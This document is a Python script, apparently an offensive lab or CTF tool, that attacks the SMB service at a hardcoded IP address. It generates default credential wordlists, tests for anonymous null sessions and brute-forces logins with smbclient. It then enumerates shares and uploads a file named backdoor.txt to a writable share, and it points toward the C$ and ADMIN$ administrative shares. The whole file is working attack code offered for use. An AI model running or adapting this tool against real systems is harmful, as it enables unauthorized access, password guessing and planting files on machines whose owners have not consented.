import subprocess
import os
import sys
import time

TARGET_IP = "12.13.14.3"
LOCAL_FILE = "backdoor.txt"
REMOTE_FILE = "backdoor.txt"

def print_banner():
    print("\n" + "="*60)
    print("SMB ATTACK TOOL - ALPINE VERSION")
    print(f"Target: {TARGET_IP}")
    print("="*60)

def check_smb_service():
    """Check if SMB service is running"""
    print("[*] Checking SMB service...")
    
    # Check port 445
    check_port = f"nc -z -w 2 {TARGET_IP} 445"
    result = subprocess.run(check_port, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] Port 445 is OPEN (SMB)")
        return True
    else:
        print("[-] Port 445 is CLOSED")
        return False

def create_wordlists():
    """Create better wordlists if needed"""
    if not os.path.exists("users.txt"):
        print("[*] Creating users.txt...")
        users = [
            "administrator", "admin", "student", "user", "guest",
            "test", "backup", "web", "ftp", "sql",
            "Administrator", "Admin", "Student", "User",
            "",  # empty username
        ]
        with open("users.txt", "w") as f:
            for user in users:
                f.write(user + "\n")
    
    if not os.path.exists("passwords.txt"):
        print("[*] Creating passwords.txt...")
        passwords = [
            "",  # empty password
            "password", "123456", "admin", "Administrator",
            "student", "Student", "11111111", "22222222",
            "12345678", "qwerty", "abc123", "password123",
            "admin123", "letmein", "welcome", "monkey",
            "123456789", "1234567890", "123123", "111111",
            "12345", "1234", "123", "1234567",
        ]
        with open("passwords.txt", "w") as f:
            for pwd in passwords:
                f.write(pwd + "\n")
    
    if not os.path.exists(LOCAL_FILE):
        print(f"[*] Creating {LOCAL_FILE}...")
        with open(LOCAL_FILE, "w") as f:
            f.write("Test file uploaded via SMB\n")
            f.write(f"Time: {time.ctime()}\n")
            f.write(f"Target: {TARGET_IP}\n")

def test_null_session():
    """Test null/anonumous session"""
    print("\n[*] Testing null session (anonymous access)...")
    
    cmd = f"smbclient -L //{TARGET_IP}/ -N"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] Null session successful!")
        print("[*] Shares found:")
        for line in result.stdout.split('\n'):
            if 'Disk' in line or 'IPC' in line:
                print(f"   {line}")
        return True
    else:
        print("[-] Null session failed")
        return False

def brute_force_smb():
    """Brute force SMB with smbclient directly"""
    print("\n[*] Starting SMB brute force...")
    
    # Read users and passwords
    if not os.path.exists("users.txt"):
        print("[-] users.txt not found")
        return None, None
    
    if not os.path.exists("passwords.txt"):
        print("[-] passwords.txt not found")
        return None, None
    
    with open("users.txt", "r") as f:
        users = [line.strip() for line in f if line.strip() is not None]
    
    with open("passwords.txt", "r") as f:
        passwords = [line.strip() for line in f if line.strip() is not None]
    
    print(f"[*] Testing {len(users)} users × {len(passwords)} passwords")
    
    for user in users:
        print(f"\n[*] Testing user: '{user}'")
        
        for pwd in passwords:
            # Show progress
            sys.stdout.write(f"  Testing password: '{pwd if pwd else '(empty)'}'\r")
            sys.stdout.flush()
            
            # Test with IPC$ share
            cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
            result = subprocess.run(cmd, shell=True)
            
            if result.returncode == 0:
                print(f"\n[+] FOUND! Credentials: '{user}':'{pwd}'")
                return user, pwd
            
            time.sleep(0.1)  # Small delay
    
    print("\n[-] No valid credentials found")
    return None, None

def test_credentials_interactive():
    """Test credentials interactively"""
    print("\n[*] Interactive credential testing")
    print("[*] Enter credentials to test (leave empty to skip)")
    
    while True:
        print("\n" + "-"*40)
        username = input("Username: ").strip()
        if not username:
            break
        
        password = input("Password: ").strip()
        
        print(f"\n[*] Testing: '{username}':'{password if password else '(empty)'}'")
        
        # Test connection
        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{username}%{password}' -c 'exit'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] CREDENTIALS WORK!")
            choice = input("[*] Use these credentials? (y/n): ").lower()
            if choice == 'y':
                return username, password
        else:
            print("[-] Invalid credentials")
            print(f"[*] Error: {result.stderr[:100] if result.stderr else 'Unknown'}")
    
    return None, None

def enumerate_shares(username, password):
    """Enumerate SMB shares with given credentials"""
    print(f"\n[*] Enumerating shares for '{username}':'{password}'...")
    
    cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode != 0:
        print("[-] Failed to enumerate shares")
        print(f"[*] Error: {result.stderr[:200]}")
        return []
    
    shares = []
    print("[*] Available shares:")
    for line in result.stdout.split('\n'):
        if 'Disk' in line or 'IPC' in line:
            try:
                parts = line.split()
                if parts:
                    share_name = parts[0]
                    shares.append(share_name)
                    print(f"   - {line}")
            except:
                pass
    
    return shares

def try_upload(username, password, share):
    """Try to upload file to specific share"""
    print(f"\n[*] Trying to upload to {share}...")
    
    # First test access
    test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit'"
    test_result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
    
    if test_result.returncode != 0:
        print(f"[-] No access to {share}")
        return False
    
    # Try upload
    upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
    print(f"[*] Command: {upload_cmd}")
    
    result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] SUCCESS! File uploaded to {share}")
        print(f"[+] Path: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
        return True
    else:
        print(f"[-] Upload failed: {result.stderr[:100] if result.stderr else 'Unknown error'}")
        return False

def main():
    print_banner()
    
    # Check SMB service
    if not check_smb_service():
        print("[-] SMB service not available")
        return
    
    # Create wordlists and test file
    create_wordlists()
    
    # Test null session first
    if test_null_session():
        print("[+] You have anonymous access!")
        print("[*] Try: smbclient //{TARGET_IP}/C$ -N -c 'dir'")
        return
    
    # Get credentials
    username, password = None, None
    
    # Option 1: Brute force
    print("\n" + "="*60)
    print("[*] OPTION 1: BRUTE FORCE")
    username, password = brute_force_smb()
    
    # Option 2: Interactive testing
    if not username:
        print("\n" + "="*60)
        print("[*] OPTION 2: INTERACTIVE TESTING")
        username, password = test_credentials_interactive()
    
    if not username:
        print("\n[-] No valid credentials obtained")
        print("[*] Try other attack methods:")
        print("    1. Check for other services (SSH, FTP, RDP)")
        print("    2. Use different wordlists")
        print("    3. Try other SMB tools (enum4linux, nmap scripts)")
        return
    
    print(f"\n[+] Using credentials: '{username}':'{password if password else '(empty)'}'")
    
    # Enumerate shares
    shares = enumerate_shares(username, password)
    
    if not shares:
        print("[-] No shares accessible with these credentials")
        return
    
    # Try to upload to writable shares
    writable_shares = []
    for share in shares:
        if share != 'IPC$':  # Skip IPC$
            if try_upload(username, password, share):
                writable_shares.append(share)
                break  # Stop after first successful upload
    
    # Summary
    print("\n" + "="*60)
    print("[*] ATTACK SUMMARY")
    print("="*60)
    
    if writable_shares:
        print("[+] SUCCESS: File uploaded to shares:", writable_shares)
    else:
        print("[-] FAILED: Could not upload file")
        print("[*] Possible reasons:")
        print("    - Read-only access")
        print("    - Insufficient permissions")
        print("    - File already exists")
        
        print("\n[*] Try these commands:")
        print(f"    1. smbclient //{TARGET_IP}/C$ -U '{username}%{password}'")
        print(f"    2. smbclient //{TARGET_IP}/ADMIN$ -U '{username}%{password}'")
        print(f"    3. Try creating a directory: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'mkdir test'")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)
